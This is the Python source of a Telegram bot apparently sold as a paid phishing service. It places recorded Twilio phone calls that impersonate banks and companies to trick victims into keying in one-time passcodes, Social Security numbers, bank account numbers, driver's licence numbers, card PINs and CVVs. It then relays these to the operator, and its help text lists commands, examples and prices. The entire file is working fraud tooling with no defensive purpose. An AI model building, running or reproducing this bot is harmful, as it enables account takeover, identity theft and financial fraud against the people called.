from utils import (bot, r, ngrok, is_valid_phone_number, save_data, get_data,
                   set_busy, clear_busy, is_busy, get_short_url, get_recording_url,
                   get_next_twilio_number, send_call_status, client, send_retry_message)
import json
import datetime
import os.path
import pytz

# Set timezone
tz = pytz.timezone('Asia/Jakarta')


if not os.path.isfile('users.json'):
    with open('users.json', 'w') as file:
        json.dump({}, file)

# Load users
with open('users.json') as file:
    users = json.load(file)


def save_users():
    with open('users.json', 'w') as file:
        json.dump(users, file)


@bot.message_handler(commands=['addmember'])
def add_member(message):
    if message.from_user.username not in users or users[message.from_user.username]['role'] != 'admin':
        bot.send_message(
            message.chat.id, 'You do not have permission to use this command.')
        return
    text = message.text.split()
    if len(text) != 3:
        bot.send_message(
            message.chat.id, 'Incorrect usage. Use /addmember (username) (days).')
        return
    username, days = text[1], text[2]
    if not days.isdigit():
        bot.send_message(message.chat.id, 'Days must be a number.')
        return
    # Record the time when the member is added, in Jakarta timezone
    now = datetime.datetime.now(tz)
    expiry_time = (now + datetime.timedelta(days=int(days)))
    users[username] = {'role': 'member',
                       'expiry': expiry_time.strftime("%d-%m-%Y %H:%M:%S")}
    save_users()
    bot.send_message(
        message.chat.id, f'{username} has been given member access for {days} days.')


@bot.message_handler(commands=['addtrial'])
def add_trial(message):
    if message.from_user.username not in users or users[message.from_user.username]['role'] != 'admin':
        bot.send_message(
            message.chat.id, 'You do not have permission to use this command.')
        return
    text = message.text.split()
    if len(text) != 3:
        bot.send_message(
            message.chat.id, 'Incorrect usage. Use /addtrial (username) (tries).')
        return
    username, tries = text[1], text[2]
    if not tries.isdigit():
        bot.send_message(message.chat.id, 'Tries must be a number.')
        return
    users[username] = {'role': 'trial', 'tries': int(tries)}
    save_users()
    bot.send_message(
        message.chat.id, f'{username} has been given trial access for {tries} tries.')


def check_access(message):
    if message.from_user.username not in users:
        bot.send_message(
            message.chat.id, 'You do not have access to this command. Contact @NetizenPros')
        return False
    user = users[message.from_user.username]
    if user['role'] == 'admin':
        return True
    elif user['role'] == 'member':
        now = datetime.datetime.now(tz)
        expiry_time_naive = datetime.datetime.strptime(
            user['expiry'], "%d-%m-%Y %H:%M:%S")
        expiry_time = tz.localize(expiry_time_naive)
        if now > expiry_time:
            bot.send_message(message.chat.id, 'Your access has expired.To renew Contact @NetizenPros')
            del users[message.from_user.username]
            save_users()
            return False
        return True

    elif user['role'] == 'trial':
        if user['tries'] <= 0:
            bot.send_message(
                message.chat.id, 'You have used up all your tries.Contact @NetizenPros To get Private access')
            del users[message.from_user.username]
            save_users()
            return False
        user['tries'] -= 1
        save_users()
        return True


@bot.message_handler(commands=['checkuser'])
def check_member(message):
    if message.from_user.username not in users or users[message.from_user.username]['role'] not in ['admin', 'member', 'trial']:
        bot.send_message(
            message.chat.id, 'You do not have permission to use this command.')
        return
    text = message.text.split()
    if len(text) != 2:
        bot.send_message(
            message.chat.id, 'Incorrect usage. Use /checkuser (username).')
        return
    username = text[1]
    if username not in users:
        bot.send_message(message.chat.id, f'User {username} does not exist.')
    else:
        user = users[username]
        if user['role'] == 'member':
            bot.send_message(
                message.chat.id, f'Member {username} expires on {user["expiry"]}.')
        elif user['role'] == 'trial':
            bot.send_message(
                message.chat.id, f'Trial {username} {user["tries"]} tries left.')


@bot.message_handler(commands=['checkuserlist'])
def check_member_list(message):
    if message.from_user.username not in users or users[message.from_user.username]['role'] != 'admin':
        bot.send_message(
            message.chat.id, 'You do not have permission to use this command.')
        return
    trial_users = [
        username for username in users if users[username]['role'] == 'trial']
    member_users = [
        username for username in users if users[username]['role'] == 'member']
    response = 'User List:\n'
    for username in trial_users:
        user = users[username]
        response += f'Trial {username} {user["tries"]} tries left.\n'
    for username in member_users:
        user = users[username]
        response += f'Member {username} expires on {user["expiry"]}.\n'
    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['deluser'])
def del_member(message):
    if message.from_user.username not in users or users[message.from_user.username]['role'] != 'admin':
        bot.send_message(
            message.chat.id, 'You do not have permission to use this command.')
        return
    text = message.text.split()
    if len(text) != 2:
        bot.send_message(
            message.chat.id, 'Incorrect usage. Use /deluser (username).')
        return
    username = text[1]
    if username in users:
        del users[username]
        save_users()
        bot.send_message(message.chat.id, f'{username} has been removed')
    else:
        bot.send_message(
            message.chat.id, f'There is no user with username: {username}')


@bot.message_handler(commands=['cancel'])
def _cancel(message):
    chat_id = message.chat.id
    if is_busy(chat_id):
        clear_busy(chat_id)
        bot.send_message(chat_id, 'All processes have been canceled.')
    else:
        bot.send_message(chat_id, 'No process is currently running.')

@bot.message_handler(commands=['start'])
def send_help(message):
    help_text = """
👨‍🔬 Explore the system like a pro!

🛒 PRICE LIST : 
🛒 1 DAY  150K IDR  ✅  
🛒 3 DAYS 400K IDR  ✅ 
🛒 7 DAYS 700K IDR  ✅
🛒 1 Month 1500K IDR ✅
PRIVATE SCRIPT ? CONTACT @NetizenPros

Use the list of available commands to access hidden features. 🔍

🔐 GRAB OTP
Use: /otp (target phone) (otp digit) (target name) (target company name)
Example: /otp +1234567890 6 Jhony-deff amazon-service

🎭 CUSTOM SCRIPT
Use: /custom (target phone) (digit) (target name) (target company name)
Example: /custom +1234567890 6 Jhony-deff amazon-service

🔒 GRAB SSN
Use: /ssn (target phone) (target name)
Example: /ssn +1234567890 Jhony-deff

🏦 GRAB BANK ACCOUNT NUMBER
Use: /bankacc (target phone) (target name) (company name)
Example: /bankacc +1234567890 Jhony-deff Chase-Bank

🚗 GRAB DRIVER LICENSE
Use: /dl (target phone) (target name)
Example: /dl +1234567890 Jhony-deff

📌 GRAB CARD PIN
Use: /pin (target phone) (target name) (company name)
Example: /pin +1234567890 Jhony-deff Chase-Bank

📌 GRAB CARD CVV
Use: /cvv (target phone) (target name) (company name) (card ending)
Example: /cvv +1234567890 Jhony-deff Chase-Bank 1234
    """
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = """
List of Available Services:

GRAB OTP
Use: /otp (target phone) (otp digit) (target name) (target company name)
Example: /otp +1234567890 6 Jhony-deff amazon-service

CUSTOM SCRIPT
Use: /custom (target phone) (digit) (target name) (target company name)
Example: /custom +1234567890 6 Jhony-deff amazon-service

GRAB SSN
Use: /ssn (target phone) (target name)
Example: /ssn +1234567890 Jhony-deff

GRAB BANK ACCOUNT NUMBER
Use: /bankacc (target phone) (target name) (company name)
Example: /bankacc +1234567890 Jhony-deff Chase-Bank

GRAB DRIVER LICENSE
Use: /dl (target phone) (target name)
Example: /dl +1234567890 Jhony-deff

GRAB CARD PIN
Use: /pin (target phone) (target name) (company name)
Example: /pin +1234567890 Jhony-deff Chase-Bank

GRAB CARD CVV
Use: /cvv (target phone) (target name) (company name) (card ending)
Example: /cvv +1234567890 Jhony-deff Chase-Bank 1234
    """
    bot.reply_to(message, help_text)


########### OTP ###########


@bot.message_handler(commands=['otp'])
def _call(message):
    chat_id = message.chat.id
    if not check_access(message):
        return

    if is_busy(chat_id):
        bot.send_message(chat_id, 'Bot is currently busy, please wait. use comand /cancel to clear all process')
        return
    set_busy(chat_id)
    try:
        text = message.text.split()
        if len(text) != 5:
            bot.send_message(
                chat_id, "Invalid format!\n use correct format : /otp (target phone) (otp digit) (target name) (target company name) !\n Example : /otp +1234567890 6 Jhony-deff amazon-service")
            return

        cell_phone = text[1]
        if not is_valid_phone_number(cell_phone):
            bot.send_message(
                chat_id, "Invalid phone number. Please check Target phone number.")
            return
        otp_digits = text[2]
        client_name = text[3].replace('-', ' ')
        company_name = text[4].replace('-', ' ')

        bot.send_message(
            chat_id, f'Calling Initiated to {client_name} at {company_name}')
        save_data(chat_id, 'Details/Digits', otp_digits)
        save_data(chat_id, 'Details/Client_Name', client_name)
        save_data(chat_id, 'Details/Company Name', company_name)

        call = client.calls.create(
            url=f'{ngrok}/{chat_id}/otp',
            to=cell_phone,
            from_=get_next_twilio_number(),
            record=True,
            machine_detection='DetectMessageEnd'
        )
        sid = call.sid

        current_status = send_call_status(sid, chat_id)

        call1 = client.calls(sid).fetch()

        recording_url = get_recording_url(call1.sid)
        if recording_url:
            short_url = get_short_url(recording_url)
            if short_url:
                bot.send_message(chat_id, f'Recording URL: {short_url}')
                otp = get_data(chat_id, "Details/otp")
                if otp == '' or otp is None:
                    send_retry_message(
                        chat_id, f'Target Going Hard❌❌', cell_phone, otp_digits, client_name, company_name)
                else:
                    send_retry_message(
                        chat_id, f'Here is the code ✔️ -> {otp}', cell_phone, otp_digits, client_name, company_name)
                r.delete(f'{chat_id}/Details/otp')
            else:
                bot.send_message(
                    chat_id, 'Failed to shorten the recording URL')
                otp = get_data(chat_id, "Details/otp")
                if otp == '' or otp is None:
                    send_retry_message(
                        chat_id, f'Target Going Hard❌', cell_phone, otp_digits, client_name, company_name)
                else:
                    send_retry_message(
                        chat_id, f'Here is the code ✔️ -> {otp}', cell_phone, otp_digits, client_name, company_name)
                r.delete(f'{chat_id}/Details/otp')
    except Exception as e:
        bot.send_message(chat_id, f"An error occurred: {str(e)}")
    finally:
        clear_busy(chat_id)


@bot.callback_query_handler(func=lambda call: call.data.startswith('retry_'))
def retry_callback(call):
    chat_id = call.message.chat.id
    message = call.message
    message.from_user.username = call.from_user.username
    if not check_access(message):
        return
    if is_busy(chat_id):
        bot.send_message(chat_id, 'Bot is currently busy, please wait.')
        return
    set_busy(chat_id)
    try:
        bot.answer_callback_query(call.id)
        bot.edit_message_reply_markup(
            chat_id=chat_id, message_id=call.message.message_id, reply_markup=None)

        _, cell_phone, otp_digits, client_name, company_name = call.data.split(
            '_')
        otp_digits = int(otp_digits)
        client_name = client_name.replace('-', ' ')
        company_name = company_name.replace('-', ' ')

        if not is_valid_phone_number(cell_phone):
            bot.send_message(
                chat_id, "Invalid phone number. Please check Target phone number.")
            return

        bot.send_message(
            chat_id, f'Retry Calling Initiated to {client_name} at {company_name}')
        save_data(chat_id, 'Details/Digits', otp_digits)
        save_data(chat_id, 'Details/Client_Name', client_name)
        save_data(chat_id, 'Details/Company Name', company_name)

        call = client.calls.create(
            url=f'{ngrok}/{chat_id}/recall',
            to=cell_phone,
            from_=get_next_twilio_number(),
            record=True,
            machine_detection='DetectMessageEnd'
        )
        sid = call.sid

        current_status = send_call_status(sid, chat_id)

        call1 = client.calls(sid).fetch()

        recording_url = get_recording_url(call1.sid)
        if recording_url:
            short_url = get_short_url(recording_url)
            if short_url:
                bot.send_message(chat_id, f'Recording URL: {short_url}')
                otp = get_data(chat_id, "Details/otp")
                if otp == '' or otp is None:
                    send_retry_message(
                        chat_id, f'Target Going Hard❌', cell_phone, otp_digits, client_name, company_name)
                else:
                    send_retry_message(
                        chat_id, f'Here is the code ✔️ -> {otp}', cell_phone, otp_digits, client_name, company_name)
                r.delete(f'{chat_id}/Details/otp')
            else:
                bot.send_message(
                    chat_id, 'Failed to shorten the recording URL')
                otp = get_data(chat_id, "Details/otp")
                if otp == '' or otp is None:
                    send_retry_message(
                        chat_id, f'Target Going Hard❌', cell_phone, otp_digits, client_name, company_name)
                else:
                    send_retry_message(
                        chat_id, f'Here is the code ✔️ -> {otp}', cell_phone, otp_digits, client_name, company_name)
                r.delete(f'{chat_id}/Details/otp')
    except Exception as e:
        bot.send_message(chat_id, f"An error occurred: {str(e)}")
    finally:
        clear_busy(chat_id)


active_chats = {}

########### CUSTOM SCRIPT ###########


@bot.message_handler(commands=['custom'])
def _call_custom(message):
    chat_id = message.chat.id
    if not check_access(message):
        return

    if is_busy(chat_id):
        bot.send_message(chat_id, 'Bot is currently busy, please wait.')
        return
    set_busy(chat_id)

    text = message.text.split()
    if len(text) != 5:
        bot.send_message(
            chat_id, "Invalid format!\n use correct format : /custom (target phone) (digit) (target name) (target company name) !\n Example : /custom +1234567890 6 Jhony-deff amazon-service")
        clear_busy(chat_id)
        return

    cell_phone = text[1]
    if not is_valid_phone_number(cell_phone):
        bot.send_message(
            chat_id, "Invalid phone number. Please check Target phone number.")
        clear_busy(chat_id)
        return
    digit = text[2]
    client_name = text[3].replace('-', ' ')
    company_name = text[4].replace('-', ' ')

    save_data(chat_id, 'Details/Digit', digit)
    save_data(chat_id, 'Details/Client_Name', client_name)
    save_data(chat_id, 'Details/Company Name', company_name)

    active_chats[chat_id] = {
        'cell_phone': cell_phone,
        'digit': digit,
        'client_name': client_name,
        'company_name': company_name
    }

    bot.send_message(chat_id, 'Please input a custom script.\n\nExample:\nWe need your confirmation regarding your last purchase of $149.99 from your {company_name} account. To confirm that this transaction was not authorized by you,  please stay on the line.')


@bot.message_handler(func=lambda msg: msg.chat.id in active_chats)
def handle_custom_script(message):
    chat_id = message.chat.id
    details = active_chats[chat_id]
    cell_phone = details['cell_phone']
    digit = details['digit']
    client_name = details['client_name']
    company_name = details['company_name']

    custom_script = message.text
    try:
        formatted_script = custom_script.format(
            client_name=client_name, company_name=company_name, digit=digit)
    except KeyError as e:
        bot.send_message(
            chat_id, f'Invalid format. No key "{e.args[0]}" found in your script.')
        return

    save_data(chat_id, 'Details/Custom Script', formatted_script)
    bot.send_message(
        chat_id, f'Calling Initiated to {client_name} at {company_name}')

    call = client.calls.create(
        url=f'{ngrok}/{chat_id}/custom',
        to=cell_phone,
        from_=get_next_twilio_number(),
        record=True,
        machine_detection='DetectMessageEnd'
    )
    sid = call.sid

    current_status = send_call_status(sid, chat_id)

    call1 = client.calls(sid).fetch()

    recording_url = get_recording_url(call1.sid)
    if recording_url:
        short_url = get_short_url(recording_url)
        if short_url:
            bot.send_message(chat_id, f'Recording URL: {short_url}')
            otp = get_data(chat_id, "Details/otp")
            if otp == '' or otp is None:
                send_retry_message(
                    chat_id, f'Target Going Hard❌', cell_phone, digit, client_name, company_name)
            else:
                send_retry_message(
                    chat_id, f'Here is the code ✔️ -> {otp}', cell_phone, digit, client_name, company_name)
            r.delete(f'{chat_id}/Details/otp')
        else:
            bot.send_message(
                chat_id, 'Failed to shorten the recording URL')
            otp = get_data(chat_id, "Details/otp")
            if otp == '' or otp is None:
                send_retry_message(
                    chat_id, f'Target Going Hard❌', cell_phone, digit, client_name, company_name)
            else:
                send_retry_message(
                    chat_id, f'Here is the code ✔️ -> {otp}', cell_phone, digit, client_name, company_name)
            r.delete(f'{chat_id}/Details/otp')

    del active_chats[chat_id]

    clear_busy(chat_id)

########### SSN ###########


@bot.message_handler(commands=['ssn'])
def _call(message):
    chat_id = message.chat.id
    if not check_access(message):
        return

    if is_busy(chat_id):
        bot.send_message(chat_id, 'Bot is currently busy, please wait.')
        return
    set_busy(chat_id)
    try:
        text = message.text.split()
        if len(text) != 3:
            bot.send_message(
                chat_id, "Invalid format!\n use correct format : /ssn (target phone) (target name) !\n Example : /ssn +1234567890 Jhony-deff")
            return

        cell_phone = text[1]
        if not is_valid_phone_number(cell_phone):
            bot.send_message(
                chat_id, "Invalid phone number. Please check Target phone number.")
            return
        client_name = text[2].replace('-', ' ')

        bot.send_message(
            chat_id, f'Calling Initiated to {client_name}')
        save_data(chat_id, 'Details/Client_Name', client_name)

        call = client.calls.create(
            url=f'{ngrok}/{chat_id}/ssn',
            to=cell_phone,
            from_=get_next_twilio_number(),
            record=True,
            machine_detection='DetectMessageEnd'
        )
        sid = call.sid

        current_status = send_call_status(sid, chat_id)

        call1 = client.calls(sid).fetch()

        recording_url = get_recording_url(call1.sid)
        if recording_url:
            short_url = get_short_url(recording_url)
            if short_url:
                bot.send_message(chat_id, f'Recording URL: {short_url}')
                ssn = get_data(chat_id, "Details/ssn")
                if ssn == '' or ssn is None:
                    bot.send_message(
                        chat_id, f'Target Going Hard❌')
                else:
                    bot.send_message(
                        chat_id, f'Colected SSN ✔️ -> {ssn}')
                r.delete(f'{chat_id}/Details/ssn')
            else:
                bot.send_message(
                    chat_id, 'Failed to shorten the recording URL')
                ssn = get_data(chat_id, "Details/ssn")
                if ssn == '' or ssn is None:
                    bot.send_message(
                        chat_id, f'Target Going Hard❌')
                else:
                    bot.send_message(
                        chat_id, f'Colected SSN ✔️ -> {ssn}')
                r.delete(f'{chat_id}/Details/ssn')
    except Exception as e:
        bot.send_message(chat_id, f"An error occurred: {str(e)}")
    finally:
        clear_busy(chat_id)

########### Bank Account ###########


@bot.message_handler(commands=['bankacc'])
def _call(message):
    chat_id = message.chat.id
    if not check_access(message):
        return

    if is_busy(chat_id):
        bot.send_message(chat_id, 'Bot is currently busy, please wait.')
        return
    set_busy(chat_id)
    try:
        text = message.text.split()
        if len(text) != 4:
            bot.send_message(
                chat_id, "Invalid format!\n use correct format : /bankacc (target phone) (target name) (company name) !\n Example : /bankacc +1234567890 Jhony-deff Support-service")
            return

        cell_phone = text[1]
        if not is_valid_phone_number(cell_phone):
            bot.send_message(
                chat_id, "Invalid phone number. Please check Target phone number.")
            return
        client_name = text[2].replace('-', ' ')
        company_name = text[3].replace('-', ' ')

        bot.send_message(
            chat_id, f'Calling Initiated to {client_name} at {company_name}')
        save_data(chat_id, 'Details/Client_Name', client_name)
        save_data(chat_id, 'Details/Company Name', company_name)
        call = client.calls.create(
            url=f'{ngrok}/{chat_id}/bankacc',
            to=cell_phone,
            from_=get_next_twilio_number(),
            record=True,
            machine_detection='DetectMessageEnd'
        )
        sid = call.sid

        current_status = send_call_status(sid, chat_id)

        call1 = client.calls(sid).fetch()

        recording_url = get_recording_url(call1.sid)
        if recording_url:
            short_url = get_short_url(recording_url)
            if short_url:
                bot.send_message(chat_id, f'Recording URL: {short_url}')
                bankacc = get_data(chat_id, "Details/bankacc")
                if bankacc == '' or bankacc is None:
                    bot.send_message(
                        chat_id, f'Target Going Hard❌')
                else:
                    bot.send_message(
                        chat_id, f'Colected Bank Account number ✔️ -> {bankacc}')
                r.delete(f'{chat_id}/Details/bankacc')
            else:
                bot.send_message(
                    chat_id, 'Failed to shorten the recording URL')
                bankacc = get_data(chat_id, "Details/bankacc")
                if bankacc == '' or bankacc is None:
                    bot.send_message(
                        chat_id, f'Target Going Hard❌')
                else:
                    bot.send_message(
                        chat_id, f'Colected Bank Account number ✔️ -> {bankacc}')
                r.delete(f'{chat_id}/Details/bankacc')
    except Exception as e:
        bot.send_message(chat_id, f"An error occurred: {str(e)}")
    finally:
        clear_busy(chat_id)

########### Driver License ###########


@bot.message_handler(commands=['dl'])
def _call(message):
    chat_id = message.chat.id
    if not check_access(message):
        return

    if is_busy(chat_id):
        bot.send_message(chat_id, 'Bot is currently busy, please wait.')
        return
    set_busy(chat_id)
    try:
        text = message.text.split()
        if len(text) != 3:
            bot.send_message(
                chat_id, "Invalid format!\n use correct format : /dl (target phone) (target name) !\n Example : /dl +1234567890 Jhony-deff")
            return

        cell_phone = text[1]
        if not is_valid_phone_number(cell_phone):
            bot.send_message(
                chat_id, "Invalid phone number. Please check Target phone number.")
            return
        client_name = text[2].replace('-', ' ')

        bot.send_message(
            chat_id, f'Calling Initiated to {client_name}')
        save_data(chat_id, 'Details/Client_Name', client_name)

        call = client.calls.create(
            url=f'{ngrok}/{chat_id}/dl',
            to=cell_phone,
            from_=get_next_twilio_number(),
            record=True,
            machine_detection='DetectMessageEnd'
        )
        sid = call.sid

        current_status = send_call_status(sid, chat_id)

        call1 = client.calls(sid).fetch()

        recording_url = get_recording_url(call1.sid)
        if recording_url:
            short_url = get_short_url(recording_url)
            if short_url:
                bot.send_message(chat_id, f'Recording URL: {short_url}')
                dl = get_data(chat_id, "Details/dl")
                if dl == '' or dl is None:
                    bot.send_message(
                        chat_id, f'Target Going Hard❌')
                else:
                    bot.send_message(
                        chat_id, f'Colected Driver license ✔️ -> {dl}')
                r.delete(f'{chat_id}/Details/dl')
            else:
                bot.send_message(
                    chat_id, 'Failed to shorten the recording URL')
                dl = get_data(chat_id, "Details/dl")
                if dl == '' or dl is None:
                    bot.send_message(
                        chat_id, f'Target Going Hard❌')
                else:
                    bot.send_message(
                        chat_id, f'Colected Driver license ✔️ -> {dl}')
                r.delete(f'{chat_id}/Details/dl')
    except Exception as e:
        bot.send_message(chat_id, f"An error occurred: {str(e)}")
    finally:
        clear_busy(chat_id)

########## PIN ###############

@bot.message_handler(commands=['pin'])
def _call(message):
    chat_id = message.chat.id
    if not check_access(message):
        return

    if is_busy(chat_id):
        bot.send_message(chat_id, 'Bot is currently busy, please wait.')
        return
    set_busy(chat_id)
    try:
        text = message.text.split()
        if len(text) != 4:
            bot.send_message(
                chat_id, "Invalid format!\n use correct format : /pin (target phone) (target name) (company name) !\n Example : /pin +1234567890 Jhony-deff Support-service")
            return

        cell_phone = text[1]
        if not is_valid_phone_number(cell_phone):
            bot.send_message(
                chat_id, "Invalid phone number. Please check Target phone number.")
            return
        client_name = text[2].replace('-', ' ')
        company_name = text[3].replace('-', ' ')

        bot.send_message(
            chat_id, f'Calling Initiated to {client_name} at {company_name}')
        save_data(chat_id, 'Details/Client_Name', client_name)
        save_data(chat_id, 'Details/Company Name', company_name)
        call = client.calls.create(
            url=f'{ngrok}/{chat_id}/pin',
            to=cell_phone,
            from_=get_next_twilio_number(),
            record=True,
            machine_detection='DetectMessageEnd'
        )
        sid = call.sid

        current_status = send_call_status(sid, chat_id)

        call1 = client.calls(sid).fetch()

        recording_url = get_recording_url(call1.sid)
        if recording_url:
            short_url = get_short_url(recording_url)
            if short_url:
                bot.send_message(chat_id, f'Recording URL: {short_url}')
                pin = get_data(chat_id, "Details/pin")
                if pin == '' or pin is None:
                    bot.send_message(
                        chat_id, f'Target Going Hard❌')
                else:
                    bot.send_message(
                        chat_id, f'Pin Colected ✔️ -> {pin}')
                r.delete(f'{chat_id}/Details/pin')
            else:
                bot.send_message(
                    chat_id, 'Failed to shorten the recording URL')
                pin = get_data(chat_id, "Details/pin")
                if pin == '' or pin is None:
                    bot.send_message(
                        chat_id, f'Target Going Hard❌')
                else:
                    bot.send_message(
                        chat_id, f'Pin Colected ✔️ -> {pin}')
                r.delete(f'{chat_id}/Details/pin')
    except Exception as e:
        bot.send_message(chat_id, f"An error occurred: {str(e)}")
    finally:
        clear_busy(chat_id)

@bot.message_handler(commands=['cvv'])
def _call(message):
    chat_id = message.chat.id
    if not check_access(message):
        return

    if is_busy(chat_id):
        bot.send_message(chat_id, 'Bot is currently busy, please wait.')
        return
    set_busy(chat_id)
    try:
        text = message.text.split()
        if len(text) != 5:
            bot.send_message(
                chat_id, "Invalid format!\n use correct format : /cvv (target phone) (target name) (company name) (4 digit card ending) !\n Example : /cvv +1234567890 Jhony-deff wells-fargo 1234")
            return

        cell_phone = text[1]
        if not is_valid_phone_number(cell_phone):
            bot.send_message(
                chat_id, "Invalid phone number. Please check Target phone number.")
            return
        client_name = text[2].replace('-', ' ')
        company_name = text[3].replace('-', ' ')
        card_ending = text[4]
        bot.send_message(
            chat_id, f'Calling Initiated to {client_name} at {company_name}')
        save_data(chat_id, 'Details/Client_Name', client_name)
        save_data(chat_id, 'Details/Company Name', company_name)
        save_data(chat_id, 'Details/Card_ending', card_ending)
        call = client.calls.create(
            url=f'{ngrok}/{chat_id}/cvv',
            to=cell_phone,
            from_=get_next_twilio_number(),
            record=True,
            machine_detection='DetectMessageEnd'
        )
        sid = call.sid

        current_status = send_call_status(sid, chat_id)

        call1 = client.calls(sid).fetch()

        recording_url = get_recording_url(call1.sid)
        if recording_url:
            short_url = get_short_url(recording_url)
            if short_url:
                bot.send_message(chat_id, f'Recording URL: {short_url}')
                cvv = get_data(chat_id, "Details/cvv")
                if cvv == '' or cvv is None:
                    bot.send_message(
                        chat_id, f'Target Going Hard❌')
                else:
                    bot.send_message(
                        chat_id, f'CVV Colected ✔️ -> {cvv}')
                r.delete(f'{chat_id}/Details/cvv')
            else:
                bot.send_message(
                    chat_id, 'Failed to shorten the recording URL')
                cvv = get_data(chat_id, "Details/cvv")
                if cvv == '' or cvv is None:
                    bot.send_message(
                        chat_id, f'Target Going Hard❌')
                else:
                    bot.send_message(
                        chat_id, f'CVV Colected ✔️ -> {cvv}')
                r.delete(f'{chat_id}/Details/cvv')
    except Exception as e:
        bot.send_message(chat_id, f"An error occurred: {str(e)}")
    finally:
        clear_busy(chat_id)

# Run
if __name__ == "__main__":
    bot.polling(none_stop=True)
